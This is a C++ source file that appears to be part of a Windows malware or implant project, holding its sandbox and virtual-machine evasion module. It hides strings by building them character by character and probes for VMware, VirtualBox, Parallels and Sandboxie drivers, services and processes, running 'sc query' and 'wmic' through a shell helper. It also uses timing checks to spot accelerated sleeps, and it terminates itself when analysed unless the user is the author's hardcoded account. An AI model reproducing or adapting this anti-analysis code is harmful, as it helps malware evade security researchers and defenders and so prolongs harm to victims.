

#include "vm.h"

#include "FileHelper.h"

#include "utils.h"

#include <winsock.h>
#include "api.h"


#pragma comment(lib,"ws2_32.lib")






int VM::checkSandbox() {

	int ret = 0;

	int vmlabel = FALSE;

	do 
	{
		char syspath[MAX_PATH];
		int len = lpGetSystemDirectoryA(syspath, sizeof(syspath));
		syspath[len] = 0;
		char drivers[] = { '\\','d','r','i','v','e','r','s','\\',0 };
		string driverpath = string(syspath) + drivers;

		char vmmouse[] = { 'v','m','m','o','u','s','e','.','s','y','s',0 };
		char vboxmouse[] = { 'V','B','o','x','M','o','u','s','e','.','s','y','s',0 };
		ret = FileHelper::CheckFileExist(driverpath + vmmouse);		//vmmemctl.sys
		if (ret)
		{
			vmlabel = 1;
			break;
		}

		ret = FileHelper::CheckFileExist(driverpath + vboxmouse);		//VBoxGuest
		if (ret)
		{
			vmlabel = 2;
			break;
		}
	
		const char sccmd[] = { 's','c',' ','q','u','e','r','y',0 };
		shell(sccmd);
		char* file = 0;
		int filesize = 0;
		ret = FileHelper::fileReader(CMD_RESULT_FILENAME, &file, &filesize);
		if (ret)
		{
			file[filesize] = 0;

			char vgas[] = { 'V','G','A','u','t','h','S','e','r','v','i','c','e',0 };
			char vmt[] = { 'V','M','T','o','o','l','s',0 };
			char vbs[] = { 'V','b','o','x','S','e','r','v','i','c','e',0 };

			char prefix[] = { 'S','E','R','V','I','C','E','_','N','A','M','E',':',' ',0 };
			string vgauth = string(prefix) + vgas+ "\r\n";
			string tool = string(prefix) + vmt+ "\r\n";
			string vboxserv = string(prefix) + vbs+ "\r\n";
		
			if (strstr(file, vgauth.c_str()) || strstr(file, tool.c_str()))
			{
				vmlabel = 1;
				break;
			}
			else if (strstr(file, vboxserv.c_str()))
			{
				vmlabel = 2;
				break;
			}
		}

		const char wmiccmd[] = { 'w','m','i','c',' ','p','a','t','h',' ','W','i','n','3','2','_',\
			'C','o','m','p','u','t','e','r','S','y','s','t','e','m',' ','g','e','t',' ','M','o','d','e','l',0 };
		shell(wmiccmd);
		ret = FileHelper::fileReader(CMD_RESULT_FILENAME, &file, &filesize);
		if (ret)
		{
			*(DWORD*)(file + filesize)= 0;

			runLog(L"model:%ws\r\n", file);

			const wchar_t vm[] = { 'V','M','w','a','r','e',0 };
			const wchar_t vb[] = {'V','i','r','t','u','a','l','B','o','x',0};
			const wchar_t vp[] = { 'V','i','r','t','u','a','l','P','C',0 };
			if (wcsstr((wchar_t*)file, vm))
			{
				vmlabel = TRUE;
				break;
			}
			else if (wcsstr((wchar_t*)file, vb))
			{
				vmlabel = 2;
				break;
			}else if (wcsstr((wchar_t*)file, vp))
			{
				vmlabel = 3;
				break;
			}
		}
	
		char vgauths[] = { 'V','G','A','u','t','h','S','e','r','v','i','c','e','.','e','x','e',0 };
		char vmtoolsd[] = { 'v','m','t','o','o','l','s','d','.','e','x','e',0 };
		char vbs[] = { 'V','B','o','x','S','e','r','v','i','c','e','.','e','x','e',0 };
		char vbt[] = { 'V','B','o','x','T','r','a','y','.','e','x','e',0 };
		DWORD pid = getPidByName(vgauths);
		if (pid)
		{
			vmlabel = 1;
			break;
		}
		pid = getPidByName(vmtoolsd);
		if (pid)
		{
			vmlabel = 1;
			break;
		}
		pid = getPidByName(vbs);
		if (pid)
		{
			vmlabel = 2;
			break;
		}
		pid = getPidByName(vbt);
		if (pid)
		{
			vmlabel = 2;
			break;
		}

		pid = getPidByName("prl_tools_service.exe");
		if (pid)
		{
			vmlabel = 4;
			break;
		}
		pid = getPidByName("prl_cc.exe");
		if (pid)
		{
			vmlabel = 4;
			break;
		}
		pid = getPidByName("prl_tools.exe");
		if (pid)
		{
			vmlabel = 4;
			break;
		}

	char szsbie[] = { 's','b','i','e','d','l','l','.','d','l','l',0 };
	HMODULE hdll = lpLoadLibraryA(szsbie);
	if (hdll)
	{
		lpFreeLibrary(hdll);
		hdll = lpLoadLibraryA(szsbie);
		if (hdll) {
			vmlabel = 3;
		}
		else {
			vmlabel = 0;
		}
	
		break;
	}

	} while (FALSE);

	if (vmlabel)
	{
#ifdef _DEBUG

#else
		char username[MAX_PATH];
		DWORD uslen = sizeof(username);
		lpGetUserNameA(username,& uslen);

// 		char hostname[MAX_PATH];
// 		ret = gethostname(hostname, sizeof(hostname));

		char computername[MAX_PATH];
		DWORD cpnl = sizeof(computername);
		ret = lpGetComputerNameA(computername, &cpnl);
		char myusername[] = { 'l','j','g',0 };
		if (lstrcmpA(username, myusername) )
		{
			runLog("running in box:%d\r\n", vmlabel);
			suicide();
		}
#endif
	}
	runLog("checkVM ok\r\n");
	return ret;
}


int VM::delay(int seconds) {

	ULONGLONG t1 = GetTickCount64() ;
	ULONGLONG t2 = t1;
	do
	{
		t2 = GetTickCount64() ;

		ULONGLONG tm1 = time(0);

		Sleep( 1000);

		ULONGLONG t3 = GetTickCount64() ;

		ULONGLONG tm2 = time(0);

		if (t3 - t2 < 1000 || tm2 - tm1 < 1) {
			while (1) {
				runLog("time delay abnormal\r\n");
				suicide();
			}	
		}
	} while (t2 - t1 < (ULONGLONG)seconds*1000);

	return 0;
}




int VM::checkTickCount() {

	DWORD dt32 = lpGetTickCount() / 1000;

	ULONGLONG dt64 = lpGetTickCount64() / 1000;

	while (dt32 < VM_EVASION_DELAY || dt64 < VM_EVASION_DELAY)
	{
		dt32 = lpGetTickCount() / 1000;

		dt64 = lpGetTickCount64() / 1000;

		lpSleep(1000);
	}

	for (int i = 0;i < 6;i ++)
	{
		ULONGLONG tm1 = time(0);
		lpSleep(1000);
		ULONGLONG tm2 = time(0);
		if (tm2 - tm1 < 1)
		{
			runLog("maybe i am running in sand box\r\n");
			suicide();
		}
	}

	return TRUE;
}






void executeCpuid(DWORD veax, DWORD* Regs)
{
#ifndef _WIN64
	DWORD deax;
	DWORD debx;
	DWORD decx;
	DWORD dedx;

	__asm
	{
		mov eax, veax; 将输入参数移入eax
		cpuid; 执行cpuid
		mov deax, eax; 以下四行代码把寄存器中的变量存入临时变量
		mov debx, ebx
		mov decx, ecx
		mov dedx, edx
	}

	Regs[0] = deax;
	Regs[1] = debx;
	Regs[2] = decx;
	Regs[3] = dedx;
#else
	return;
#endif
}


char* cpuBrand(char* strCpuBrand)
{
	strCpuBrand[0] = 0;

	char strcpu[256] = { 0 };
	DWORD Regs[4] = { 0 };
	DWORD BRANDID = 0x80000002;		// 从0x80000002开始，到0x80000004结束,用来存储商标字符串，48个字符
	for (DWORD i = 0; i < 3; i++)
	{
		executeCpuid(BRANDID + i, Regs);
		RtlMoveMemory(strcpu + i * 16, (char*)Regs, 16);
	}

	lstrcpyA(strCpuBrand, strcpu);

	return strCpuBrand;
}
